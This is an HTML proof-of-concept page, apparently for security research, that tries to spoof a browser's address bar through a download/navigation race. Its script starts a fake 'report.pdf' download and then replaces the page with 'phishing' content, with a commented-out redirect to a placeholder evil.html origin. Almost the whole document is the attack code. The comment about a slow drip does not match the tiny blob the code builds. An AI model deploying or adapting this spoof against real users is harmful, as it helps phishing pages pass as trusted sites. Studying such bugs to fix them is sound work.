<!DOCTYPE html>
<html>

<title>Research PoC - Download Nav Race</title>
</head>
<body>
<h3>PoC: Address bar spoof via download race</h3>
<p>Expected: URL bar shows evil.html after navigation.<br>
Bug (if present): URL bar still shows the original download URL.</p>
<script>
// 1. Trigger a download that stays active (slow drip keeps it alive)
function slowDownload() {
  const blob = new Blob([new ArrayBuffer(1024)], {type: "application/octet-stream"});
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "report.pdf";
  a.click();
}

// 2. Immediately navigate to attacker-controlled "phishing" content
//    while the download is still in progress
function run() {
  slowDownload();
  setTimeout(() => {
    location.replace(location.href.split("#")[0] + "#phishing-content");
    // For a real test, replace() to a different origin page you control:
    // location.replace("https://YOUR-TEST-ORIGIN.example/evil.html");
  }, 50);
}
</script>
<button onclick="run()">Start PoC</button>
</body>
</html>
